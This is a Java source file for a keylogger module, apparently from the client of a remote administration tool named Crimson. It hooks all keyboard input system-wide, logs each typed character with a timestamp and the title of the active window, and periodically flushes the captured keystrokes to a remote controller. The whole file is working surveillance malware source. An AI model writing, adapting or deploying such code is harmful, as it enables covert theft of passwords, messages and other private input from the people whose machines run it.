/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client.modules;

import java.util.ArrayList;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
import com.subterranean_security.crimson.client.net.ClientCommands;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.util.Native;

public enum Keylogger {
	;
	private static final Logger log = LoggerFactory.getLogger(Keylogger.class);

	private static Thread monitor;

	// dont forget to notify this buffer when using event method
	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>();

	public static RefreshMethod method;

	public static void start(RefreshMethod m, int value) {
		method = m;

		stop();
		log.info("Starting keylogger");
		monitor = new Thread(new Runnable() {
			public void run() {
				try {
					switch (method) {
					case EVENT:
						while (!monitor.isInterrupted()) {
							// wait for an event
							buffer.wait();
							if (buffer.size() > value) {
								ClientCommands.flushKeybuffer();
							}

						}
						break;
					case TIME:
						while (!monitor.isInterrupted()) {
							Thread.sleep(value);
							ClientCommands.flushKeybuffer();

						}
						break;
					default:
						break;

					}

				} catch (InterruptedException e) {
					log.info("Exited monitoring thread");
				} // TODO test for IllegalStateException

			}
		});
		monitor.start();

		try {
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(new NKL());
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			stop();
		}

	}

	public static void stop() {
		if (monitor != null) {
			log.info("Stopping keylogger");

			monitor.interrupt();
			monitor = null;
		}

		try {
			GlobalScreen.unregisterNativeHook();
		} catch (NativeHookException e) {

		}

	}

	public static boolean isLogging() {
		return monitor == null ? false : monitor.isAlive();
	}

	public enum RefreshMethod {
		TIME, EVENT;
	}

}

class NKL implements NativeKeyListener {

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {

		// grab that window title
		String windowTitle = null;
		try {
			windowTitle = Native.getActiveWindow();
		} catch (Throwable e1) {
			windowTitle = "unknown window";
		}

		synchronized (Keylogger.buffer) {
			Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(e.getWhen()).setTitle(windowTitle)
					.setEvent((e.getModifiers() == 0 ? "" : "") + e.getKeyChar()).build());

			if (Keylogger.method == RefreshMethod.EVENT) {
				// notify monitor thread
				Keylogger.buffer.notifyAll();

			}
		}

	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}
}
